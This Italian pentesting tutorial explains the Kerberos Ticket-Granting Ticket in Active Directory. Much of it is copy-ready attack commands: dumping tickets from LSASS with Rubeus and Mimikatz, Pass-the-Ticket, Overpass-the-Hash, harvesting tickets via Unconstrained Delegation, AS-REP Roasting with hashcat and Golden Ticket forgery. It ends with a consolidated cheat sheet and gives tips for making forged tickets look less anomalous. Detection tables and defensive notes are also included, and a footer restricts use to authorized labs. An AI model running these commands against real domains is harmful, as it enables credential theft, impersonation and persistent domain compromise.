---
title: 'TGT Kerberos: Cos’è, Come Funziona e Come Sfruttarlo'
slug: tgt
description: >-
  Scopri come funziona il Ticket-Granting Ticket (TGT) Kerberos in Active
  Directory: dump con Rubeus, Pass-the-Ticket, Overpass-the-Hash e Golden
  Ticket.
image: /tgt-kerberos-ticket-granting-ticket-active-directory.webp
draft: false
date: 2026-07-21T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - TGT Kerberos
  - Pass-the-Ticket
  - Overpass-the-Hash
  - Golden Ticket
  - AS-REP Roasting
---

# TGT Kerberos: Funzionamento, Dump e Attacchi nel Pentesting

Il TGT (Ticket Granting Ticket) è il cuore del protocollo [Kerberos](https://hackita.it/articoli/kerberos/): è il ticket che un utente riceve al login e che gli permette di richiedere accesso ai servizi del dominio senza reinserire la password. Per un attaccante, il TGT è un obiettivo primario — chi controlla il TGT controlla l'identità.

## Cos'è il TGT e cosa contiene

Il **Ticket Granting Ticket** è un ticket Kerberos rilasciato dal **KDC (Key Distribution Center)** — tipicamente il Domain Controller — in risposta a una richiesta di autenticazione (AS-REQ).

Il TGT non contiene le credenziali dell'utente in chiaro. La risposta AS-REP contiene due elementi distinti:

| Elemento                              | Descrizione                                       | Cifrato con                                     |
| ------------------------------------- | ------------------------------------------------- | ----------------------------------------------- |
| **TGT**                               | Identità, PAC (gruppi, SID, privilegi), timestamp | Hash di **krbtgt** — solo il DC può decifrarlo  |
| **Session Key** (dentro il TGT)       | Chiave per comunicare con il TGS                  | Parte della struttura cifrata con krbtgt        |
| **Session Key** (copia per il client) | Copia della session key                           | Hash dell'**utente** — il client può decifrarlo |

**Validity:** per impostazione predefinita, un TGT in Active Directory dura **10 ore** ed è **rinnovabile per 7 giorni**, ma entrambi i valori sono configurabili tramite [Kerberos Policy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/0fce5b92-bcc1-4b96-9c2b-56397c3f144f) (`MaxTicketAge` e `MaxRenewAge`).

Il client non può leggere il contenuto del TGT, ma lo usa come "badge" da presentare al KDC per richiedere Service Ticket verso i servizi del dominio.

## TGT vs TGS — differenze chiave

| Elemento            | **TGT**                                                  | **TGS (Service Ticket)**                                          |
| ------------------- | -------------------------------------------------------- | ----------------------------------------------------------------- |
| Rilasciato da       | Authentication Service (AS) — DC                         | Ticket Granting Service (TGS) — DC                                |
| Usato per           | Richiedere Service Ticket verso altri servizi            | Accedere direttamente a uno specifico servizio (CIFS, LDAP, ecc.) |
| Cifrato con         | Hash di **krbtgt**                                       | Hash dell'**account del servizio**                                |
| Durata tipica       | 10 ore (rinnovabile 7 giorni)                            | Solitamente 10 ore anche lui                                      |
| Attacchi principali | Pass-the-Ticket, Golden Ticket, Unconstrained Delegation | Kerberoasting, Silver Ticket                                      |

**Distinzione pratica:** se vuoi muoverti lateralmente hai bisogno del **TGT** (per fare richieste al KDC); se vuoi accedere direttamente a una risorsa specifica (share SMB, LDAP), usi il **Service Ticket**.

## Flusso AS-REQ / AS-REP

```
CLIENT                            KDC (Domain Controller)
  │                                        │
  │──── AS-REQ ────────────────────────────►│
  │     (username + pre-auth cifrata        │
  │      con hash della password, se attiva)│
  │                                        │
  │◄─── AS-REP ────────────────────────────│
  │     (TGT cifrato con krbtgt hash +     │
  │      Session Key cifrata con hash utente)
  │                                        │
  │── [usa TGT per richiedere TGS] ──►     │
```

**Pre-authentication:** il client cifra un timestamp con la propria chiave (derivata dalla password). Il KDC verifica che il client possieda effettivamente la chiave dell'account prima di rilasciare l'AS-REP.

**Cosa protegge la pre-auth:**

* Blocca gli attacchi di replay (finestra di validità stretta, circa 5 minuti)
* Richiede conoscenza della chiave prima del rilascio dell'AS-REP
* Impedisce che utenti non autenticati ottengano materiale crackabile offline

**Quando pre-auth è disabilitata** → chiunque può richiedere un AS-REP per quell'utente senza sapere la password → AS-REP Roasting. Classificato da MITRE come [T1558.004](https://attack.mitre.org/techniques/T1558/004/).

## Ticket flags — cosa significano

I flag su un ticket Kerberos (visibili in [Rubeus](https://hackita.it/articoli/rubeus/) dump, `klist`, file `.kirbi`/`.ccache`) indicano proprietà importanti:

| Flag                 | Significato                              | Rilevanza offensiva                         |
| -------------------- | ---------------------------------------- | ------------------------------------------- |
| **initial**          | Ticket ottenuto via pre-auth (AS-REP)    | TGT "pulito" vs TGT da Roasting             |
| **pre\_authent**     | Pre-authentication usata                 | Assenza = possibile Roasting                |
| **forwardable**      | Può essere inoltrato ad altri servizi    | Essenziale per Unconstrained Delegation     |
| **proxiable**        | Può essere usato in proxy                | Rilevante per delegazione                   |
| **renewable**        | Può essere rinnovato entro `MaxRenewAge` | Accesso prolungato senza nuova auth         |
| **ok\_as\_delegate** | Il servizio è trusted per la delega      | Indica se Unconstrained Delegation è attiva |

**Pratica:** un ticket senza `pre_authent` è quasi certamente frutto di AS-REP Roasting. Un ticket senza `forwardable` non è utilizzabile in scenari di delegazione.

## Dump del TGT — da memoria e da disco

Il TGT viene memorizzato nel processo **LSASS** su Windows. Con i permessi giusti puoi estrarlo con [Rubeus](https://hackita.it/articoli/rubeus/) o [Mimikatz](https://hackita.it/articoli/mimikatz/) e riusarlo su un altro host.

**Rubeus — dump da memoria**

```powershell
# Lista tutti i ticket in memoria (utente corrente)
.\Rubeus.exe triage

# Dump di tutti i ticket (richiede privilegi elevati)
.\Rubeus.exe dump /nowrap

# Dump solo dei TGT
.\Rubeus.exe dump /service:krbtgt /nowrap

# Dump di un utente specifico
.\Rubeus.exe dump /user:administrator /nowrap
```

**Mimikatz — due comandi diversi, ambito diverso**

```powershell
# sekurlsa::tickets — accede direttamente a LSASS, estrae ticket da TUTTE le sessioni
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# kerberos::list — opera solo sulla sessione CORRENTE, non su LSASS
.\mimikatz.exe "kerberos::list /export" "exit"
```

**Differenza pratica:** `sekurlsa::tickets` è più aggressivo e completo (tutti i ticket nel sistema); `kerberos::list` è limitato alla sessione attuale.

**Da disco — file .ccache e .kirbi**

```bash
# Converti .kirbi (Windows) → .ccache (Linux/Impacket)
ticketConverter.py administrator.kirbi administrator.ccache

# Imposta la variabile d'ambiente per Impacket
export KRB5CCNAME=/path/to/administrator.ccache

# Verifica ticket valido
klist
```

## Pass-the-Ticket — usa il TGT di un altro utente

Hai il TGT di un utente (dumped da LSASS o richiesto via Overpass-the-Hash): lo inietti nella sessione corrente e ti muovi come quell'utente senza conoscerne la password.

```powershell
# Rubeus — inietta il TGT
.\Rubeus.exe ptt /ticket:doIFuj...base64...==
.\Rubeus.exe ptt /ticket:administrator.kirbi

klist
dir \\DC01\C$
```

```bash
# Impacket (da Kali)
export KRB5CCNAME=/path/to/ticket.ccache

psexec.py -k -no-pass corp.local/administrator@DC01.corp.local
wmiexec.py -k -no-pass corp.local/administrator@DC01.corp.local
smbclient.py -k -no-pass //DC01.corp.local/C$ -U corp.local/administrator

nxc smb DC01.corp.local --use-kcache
```

Gli stessi principi valgono usando [WMIExec](https://hackita.it/articoli/wmiexec/), [PsExec](https://hackita.it/articoli/psexec/) o [Evil-WinRM](https://hackita.it/articoli/evilwinrm/) — l'unica differenza è il protocollo usato per l'esecuzione remota, non il modo in cui il ticket viene presentato al KDC.

> **Detection:** quando inietti un TGT già esistente il KDC non emette necessariamente un nuovo Event 4768, perché non sta creando un nuovo ticket. Quando invece il ticket viene usato per richiedere un Service Ticket, genera **Event ID 4769**. Un 4769 senza 4768 precedente coerente sullo stesso account/host è un'anomalia da correlare. MITRE classifica questo riutilizzo come [T1550.003](https://attack.mitre.org/techniques/T1550/003/) — Pass the Ticket.

## Overpass-the-Hash / Pass-the-Key

Hai l'NT hash di un utente (da [Mimikatz](https://hackita.it/articoli/mimikatz/) o da [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)): puoi usarlo per richiedere un TGT Kerberos valido, convertendo l'attacco da NTLM a Kerberos.

* **Overpass-the-Hash:** usa l'NT hash (RC4) → richiede TGT con cifratura RC4
* **Pass-the-Key:** usa la chiave AES (128 o 256 bit) → più coerente con ambienti moderni

```bash
# Overpass-the-Hash con Impacket (NT hash)
getTGT.py -hashes 'aad3b435b51404eeaad3b435b51404ee:NThash' corp.local/administrator

# Pass-the-Key con chiave AES256
getTGT.py -aesKey 'AES256key...' corp.local/administrator

export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass corp.local/administrator@DC01.corp.local
```

```powershell
# Rubeus — Overpass-the-Hash
.\Rubeus.exe asktgt /user:administrator /rc4:NThash /ptt

# Con AES256 (più coerente su ambienti moderni)
.\Rubeus.exe asktgt /user:administrator /aes256:AESkey /ptt /opsec

# Processo figlio con il ticket (per lateral movement)
.\Rubeus.exe asktgt /user:administrator /rc4:NThash /createnetonly:C:\Windows\System32\cmd.exe
```

**Nota su `/opsec`:** il flag riduce le differenze tra il traffico generato da Rubeus e quello nativo di Windows, ma è pensato per traffico AES256. Usarlo con RC4 richiede quasi sempre `/force`, il che vanifica parte del vantaggio — RC4 in un dominio moderno è già di per sé un segnale forte.

Sul DC, ogni richiesta TGT genera Event 4768. Il campo `TicketEncryptionType` indica la cifratura usata: `0x17` = RC4-HMAC, `0x11` = AES128, `0x12` = AES256. Vedere `0x17` in un ambiente moderno è un buon indicatore che l'account, l'host o il fallback del KDC permettono ancora RC4 — Microsoft ha pubblicato una [guida dedicata al rilevamento e rimozione di RC4](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos) in Kerberos.

## Unconstrained Delegation — raccolta TGT privilegiati

Un server configurato con **Unconstrained Delegation** riceve TGT **inoltrabili** dagli utenti che vi effettuano l'accesso, e può conservarli per impersonare l'utente verso altri servizi. Puoi identificare questi server in dominio con [BloodHound](https://hackita.it/articoli/bloodhound/), cercando nodi con l'attributo `unconstraineddelegation` a true.

**Scenario di attacco:**

1. Comprometti un server con Unconstrained Delegation abilitato
2. Monitora i TGT in arrivo quando utenti privilegiati vi si connettono
3. Estrai i TGT e usali per accedere come quell'utente

```powershell
# Monitora continuamente i TGT in arrivo
.\Rubeus.exe monitor /interval:1 /nowrap

# Raccolta una tantum
.\Rubeus.exe harvest /interval:1 /nowrap

# Dump di un TGT specifico trovato
.\Rubeus.exe dump /service:krbtgt /user:admin /nowrap
```

Il TGT raccolto è tipicamente `forwardable`, quindi riusabile su altri host per Pass-the-Ticket verso LDAP, SMB, ecc.

## AS-REP Roasting — ottenere materiale crackabile senza pre-authentication

Se un account ha **"Do not require Kerberos preauthentication"** abilitato, chiunque può richiedere un AS-REP per quell'account. La risposta contiene una parte cifrata con la password dell'utente → crackabile offline.

**Importante:** l'AS-REP contiene un TGT, ma **non è direttamente usabile** per Pass-the-Ticket senza la chiave di sessione decifrata. Devi prima:

1. Crackare la password offline (dal materiale cifrato dell'AS-REP)
2. Usare quella password per ottenere un TGT normale con pre-auth

L'attacco è trattato in dettaglio in [AS-REP Roasting](https://hackita.it/articoli/as-rep-roasting).

```bash
# Identifica account vulnerabili e richiedi materiale crackabile
GetNPUsers.py corp.local/ -dc-ip 10.10.10.5 -no-pass -usersfile users.txt -format hashcat
GetNPUsers.py corp.local/user:pass -dc-ip 10.10.10.5 -request -format hashcat

# Output: $krb5asrep$23$username@corp.local:...hash...
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# Una volta crackata la password, ottieni un TGT valido
getTGT.py corp.local/username:plaintext_password
```

**MITRE:** `T1558.004`.

## Golden Ticket — TGT forgiato

Con l'hash di **krbtgt** (ottenuto da [DCSync](https://hackita.it/articoli/dcsync/) o dump del NTDS) puoi forgiare TGT arbitrari — per qualsiasi utente, con qualsiasi gruppo, con qualsiasi scadenza. Approfondito in [Golden Ticket](https://hackita.it/articoli/golden-ticket/).

```powershell
# Mimikatz — RC4
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:NThash /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

# Mimikatz — con chiave AES256 (raccomandato su ambienti moderni: RC4 è in dismissione e spicca nella telemetria)
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /aes256:AES256keyHex /ptt" "exit"
```

```bash
# Impacket — RC4
ticketer.py -nthash NThashKrbtgt -domain-sid S-1-5-21-... -domain corp.local administrator

# Impacket — AES256
ticketer.py -aesKey AES256keyHex -domain-sid S-1-5-21-... -domain corp.local administrator

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass corp.local/administrator@DC01.corp.local
```

**Parametri utili per il lifetime:** `/startoffset` (offset iniziale), `/endin` (durata), `/renewmax` (rinnovi massimi) — tutti in minuti. Utili per non generare un ticket con validità anomala.

**Segnale di detection importante:** per default Mimikatz firma il Golden Ticket per **10 anni**. Questo valore spicca enormemente in qualsiasi richiesta TGS successiva confrontata con la policy reale del dominio (10 ore). Impostare `/endin` e `/renewmax` su valori coerenti con la policy del dominio riduce (ma non elimina) questa anomalia.

**Persistenza e invalidazione:**

* Il Golden Ticket rimane valido finché la password di krbtgt non viene resettata **due volte** (il DC mantiene la password precedente per la convalida)
* Serve attendere almeno il massimo lifetime dei ticket configurato nel dominio (default 10 ore) tra i due reset, e verificare la replica tra tutti i domain controller

**MITRE:** [T1558.001](https://attack.mitre.org/techniques/T1558/001/).

## TGT e privilegi reali

Possedere un TGT **non rende automaticamente Domain Admin**. Il ticket permette di operare con l'identità e i privilegi associati all'account rappresentato — l'accesso effettivo dipende da gruppi, ACL e autorizzazioni dei servizi. Lo stesso principio vale per attacchi correlati come [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/) o [RBCD](https://hackita.it/articoli/rbcd/): ottenere un ticket non equivale ad ottenere privilegi che l'account non aveva già.

I difensori possono validare il PAC di un ticket contro i dati reali in AD: gruppi impossibili, buffer PAC mancanti o metadati che non coincidono con LDAP sono indicatori concreti di un ticket forgiato, quando i servizi implementano questa verifica.

## Credential Guard e LSA Protection

[Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/) (Windows 10/11, Server 2016+) isola i segreti Kerberos in un contenitore protetto. Quando attivo:

* I ticket non possono essere dumped da LSASS con i metodi classici di Mimikatz/Rubeus
* Alcuni attacchi come Pass-the-Ticket possono ancora funzionare se eseguiti nello stesso contesto locale

**LSA Protection** disabilita l'accesso diretto a LSASS da processi non protetti, bloccando ulteriormente dump di ticket, NTLM e chiavi di sessione.

```powershell
# Verifica se Credential Guard è abilitato
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name LsaCfgFlags
```

Il Golden Ticket resta comunque efficace anche con Credential Guard attivo, perché non richiede accesso a LSASS per essere forgiato — solo l'hash di krbtgt ottenuto altrove (es. DCSync).

## Detection realistica

| Tecnica                    | Indicatori principali                                                             |
| -------------------------- | --------------------------------------------------------------------------------- |
| Dump TGT (Rubeus/Mimikatz) | Accesso anomalo a LSASS, Sysmon Event ID 10 (Process Access)                      |
| AS-REP Roasting            | Event 4768 senza pre-authentication per account insoliti                          |
| Overpass-the-Hash          | Event 4768 con encryption type inatteso (`0x17` RC4 su ambienti moderni)          |
| Pass-the-Ticket            | Event 4769 senza sequenza 4768/4624 coerente sullo stesso host/utente             |
| Golden Ticket              | Event 4769 senza TGT precedente, lifetime anomalo, gruppi/PAC incoerenti con LDAP |
| Unconstrained Delegation   | Ticket forwardable in memoria su server che non è un DC                           |

**Correlazioni utili:**

* Account senza pre-auth + richieste 4768 multiple in pochi secondi → possibile AS-REP Roasting
* 4769 senza 4768 precedente sullo stesso host/utente → possibile Pass-the-Ticket
* Domain Admin logon raro seguito da richieste TGS a servizi critici → possibile Golden Ticket

## Troubleshooting Kerberos pratico

| Problema                                | Causa probabile                                  | Soluzione                                                                                      |
| --------------------------------------- | ------------------------------------------------ | ---------------------------------------------------------------------------------------------- |
| `KDC_ERR_PREAUTH_FAILED` con getTGT.py  | Password o hash errati                           | Verifica hash con [secretsdump](https://hackita.it/articoli/dcsync/), prova password in chiaro |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN`           | Utente non esiste o username errato              | Usa FQDN completo `corp.local/username`                                                        |
| Pass-the-Ticket: permesso negato su SMB | Ticket scaduto o è un Service Ticket, non un TGT | Verifica con `klist`, controlla ACL                                                            |
| `KRB5CCNAME` non riconosciuto           | Percorso relativo o variabile non esportata      | `export KRB5CCNAME=/path/assoluto/ticket.ccache`                                               |
| RC4 disabilitato, richieste falliscono  | DC ha RC4 disabilitato per policy                | Usa AES256 (`/aes256` su Rubeus, `-aesKey` su Impacket)                                        |
| SPN non valido                          | Hostname/IP invece di FQDN                       | Usa FQDN del servizio, es. `CIFS/DC01.corp.local`                                              |
| Errore KRB\_AP\_ERR\_SKEW               | Differenza oraria > 5 minuti col KDC             | `ntpdate -q 10.10.10.5` per verificare, poi sincronizza                                        |
| ticketConverter.py fallisce             | Percorso relativo non risolto                    | Usa percorso assoluto                                                                          |

```bash
# Debug Kerberos verboso
export KRB5_TRACE=/dev/stdout
psexec.py -k -no-pass ...

# Verifica sincronizzazione oraria
ntpdate -q 10.10.10.5
```

## Tecniche MITRE ATT\&CK

| Tecnica                          | ID MITRE    |
| -------------------------------- | ----------- |
| Golden Ticket                    | `T1558.001` |
| Silver Ticket                    | `T1558.002` |
| Kerberoasting                    | `T1558.003` |
| AS-REP Roasting                  | `T1558.004` |
| Credential Cache Files (.ccache) | `T1558.005` |
| Pass the Ticket                  | `T1550.003` |
| OS Credential Dumping            | `T1003`     |
| LSASS Memory                     | `T1003.001` |
| Forced Authentication (delega)   | `T1187`     |

## Cheat Sheet

```
=== DUMP TGT ===
Rubeus:                       .\Rubeus.exe dump /service:krbtgt /nowrap
Mimikatz (LSASS, tutti):      "sekurlsa::tickets /export"
Mimikatz (sessione corrente): "kerberos::list /export"
Converti:                     ticketConverter.py ticket.kirbi ticket.ccache

=== PASS-THE-TICKET ===
Windows:    .\Rubeus.exe ptt /ticket:base64==  oppure  /ticket:file.kirbi
Linux:      export KRB5CCNAME=ticket.ccache → psexec.py -k -no-pass ...

=== OVERPASS-THE-HASH / PASS-THE-KEY ===
RC4:        getTGT.py -hashes ':NThash' corp.local/user
AES256:     getTGT.py -aesKey AES256key corp.local/user
Rubeus RC4: .\Rubeus.exe asktgt /user:X /rc4:NThash /ptt
Rubeus AES: .\Rubeus.exe asktgt /user:X /aes256:AESkey /ptt /opsec

=== UNCONSTRAINED DELEGATION ===
Monitor:    .\Rubeus.exe monitor /interval:1 /nowrap
Harvest:    .\Rubeus.exe harvest /interval:1 /nowrap

=== AS-REP ROASTING ===
Enumera:    GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -format hashcat
Cracka:     hashcat -m 18200 hashes.txt rockyou.txt
Post-crack: getTGT.py corp.local/username:password

=== GOLDEN TICKET ===
Mimikatz RC4:  kerberos::golden /user:X /domain:corp /sid:S-1-5-21-... /krbtgt:hash /ptt
Mimikatz AES:  kerberos::golden /user:X /domain:corp /sid:... /aes256:AESkey /ptt
Impacket RC4:  ticketer.py -nthash hash -domain-sid S-1-5-21-... -domain corp.local admin
Impacket AES:  ticketer.py -aesKey AESkey -domain-sid S-1-5-21-... -domain corp.local admin

=== DETECTION ===
Dump LSASS:            Sysmon Event 10 + GrantedAccess anomalo
AS-REP Roasting:       4768 senza pre-auth per account insoliti
Overpass-the-Hash:     4768 + encryption type 0x17 (RC4) su ambienti moderni
Pass-the-Ticket:       4769 senza 4768 precedente coerente
Golden Ticket:         4769 + lifetime anomalo, gruppi/PAC incoerenti con LDAP

=== TROUBLESHOOTING ===
Skew orario:            ntpdate -q DC
KRB5CCNAME non letto:   export KRB5CCNAME=/path/assoluto/ticket.ccache
RC4 disabilitato:       usa /aes256 o -aesKey
SPN non trovato:        usa FQDN, non IP
```

**Altri articoli correlati:**

* [Kerberoasting](https://hackita.it/articoli/kerberoasting/)
* [DPAPI](https://hackita.it/articoli/dpapi/)
* [NTLM Relay](https://hackita.it/articoli/ntlm-relay/)

> Uso esclusivo in ambienti autorizzati (HTB, HackLab, lab privati, pentest autorizzati).
